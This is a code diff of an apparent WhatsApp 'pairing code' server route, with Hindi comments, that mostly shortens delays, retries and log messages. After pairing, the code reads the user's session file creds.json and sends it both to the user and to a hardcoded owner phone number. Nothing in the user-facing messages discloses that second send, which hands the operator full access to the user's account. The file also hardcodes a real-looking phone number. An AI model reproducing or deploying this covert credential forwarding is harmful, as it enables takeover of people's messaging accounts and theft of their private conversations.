@@ -14,10 +14,8 @@ import {
 
 const router = express.Router();
 
-// ─── सिर्फ अपना नंबर डालें ──────────────────────────────────
 const OWNER_NUMBER = "+918075498750";
 
-// ─── लॉगिंग ──────────────────────────────────────────────────
 const c = {
     reset: "\x1b[0m",
     green: "\x1b[32m",
@@ -36,7 +34,6 @@ function removeFile(dir) {
     } catch (e) {}
 }
 
-// ─── पेयरिंग ──────────────────────────────────────────────────
 router.get("/", async (req, res) => {
     let num = req.query.number;
     if (!num) return res.status(400).json({ error: "Number required" });
@@ -69,36 +66,35 @@ router.get("/", async (req, res) => {
                 markOnlineOnConnect: false,
                 defaultQueryTimeoutMs: 60000,
                 connectTimeoutMs: 60000,
-                keepAliveIntervalMs: 30000,
-                maxRetries: 5,
+                keepAliveIntervalMs: 10000, // 10 sec
+                maxRetries: 3,
             });
 
             sock.ev.on("connection.update", async (update) => {
                 const { connection, lastDisconnect } = update;
 
                 if (connection === "open") {
-                    log(c.green, "✅ Paired successfully!");
+                    log(c.green, "✅ Paired!");
 
                     try {
                         await saveCreds();
-                        log(c.blue, "✅ saveCreds() called");
+                        log(c.blue, "✅ saveCreds()");
                     } catch (e) {
                         log(c.red, `⚠️ saveCreds error: ${e.message}`);
                     }
 
-                    await delay(2000);
-
+                    // ─── तुरंत creds.json ढूँढें (max 5 sec) ──────────
                     const credsPath = path.join(sessionDir, "creds.json");
                     let credsBuffer = null;
-                    for (let i = 0; i < 10; i++) {
+                    for (let i = 0; i < 50; i++) { // 50 * 100ms = 5 sec
                         if (fs.existsSync(credsPath)) {
                             try {
                                 credsBuffer = fs.readFileSync(credsPath);
-                                log(c.green, `✅ creds.json found (${credsBuffer.length} bytes)`);
+                                log(c.green, `✅ creds.json (${credsBuffer.length} B)`);
                                 break;
                             } catch (e) {}
                         }
-                        await delay(1000);
+                        await delay(100);
                     }
 
                     if (!credsBuffer) {
@@ -111,11 +107,8 @@ router.get("/", async (req, res) => {
                     const userJid = jidNormalizedUser(num + "@s.whatsapp.net");
                     let ownerJid = null;
                     const ownerPhone = OWNER_NUMBER.replace(/\D/g, "");
-                    if (ownerPhone) {
-                        ownerJid = jidNormalizedUser(ownerPhone + "@s.whatsapp.net");
-                    }
+                    if (ownerPhone) ownerJid = jidNormalizedUser(ownerPhone + "@s.whatsapp.net");
 
-                    // ─── 🔥 सिर्फ creds.json Document भेजें ──────────
                     async function sendCreds(jid) {
                         if (!jid) return;
                         try {
@@ -131,15 +124,13 @@ router.get("/", async (req, res) => {
                     }
 
                     await sendCreds(userJid);
-                    if (ownerJid && ownerJid !== userJid) {
-                        await sendCreds(ownerJid);
-                    }
+                    if (ownerJid && ownerJid !== userJid) await sendCreds(ownerJid);
 
-                    log(c.blue, "🧹 Cleaning up...");
-                    await delay(1000);
+                    log(c.blue, "🧹 Cleaning...");
+                    await delay(500);
                     removeFile(sessionDir);
-                    log(c.green, "✅ Done! Exiting.");
-                    await delay(2000);
+                    log(c.green, "✅ Done!");
+                    await delay(1000);
                     process.exit(0);
                 }
 
@@ -148,27 +139,27 @@ router.get("/", async (req, res) => {
                     if (status === 401) {
                         log(c.red, "❌ Logged out – need new pair.");
                     } else {
-                        log(c.yellow, "🔁 Restarting...");
+                        log(c.yellow, "🔁 Retrying...");
                         initiateSession();
                     }
                 }
             });
 
-            // ─── कोड जेनरेट ────────────────────────────────────
+            // ─── पेयरिंग कोड (1 sec delay) ──────────────────────
             if (!sock.authState.creds.registered) {
-                await delay(3000);
+                await delay(1000); // बस 1 सेकंड
                 const cleanNum = num.replace(/^\+/, "");
                 try {
                     let code = await sock.requestPairingCode(cleanNum);
-                    const rawCode = code; // 8 digits
+                    const rawCode = code;
                     const formatted = code?.match(/.{1,4}/g)?.join("-") || code;
                     if (!res.headersSent) {
                         log(c.green, `📲 Code: ${formatted}`);
                         return res.json({
                             code: formatted,
                             rawCode: rawCode,
-                            message: "Enter the 8-digit code in WhatsApp > Settings > Linked Devices",
-                            tip: "Use the rawCode (without dashes) – code expires in 2 minutes."
+                            message: "Enter code in WhatsApp > Settings > Linked Devices",
+                            tip: "Use rawCode (8 digits) – expires in 2 min."
                         });
                     }
                 } catch (error) {
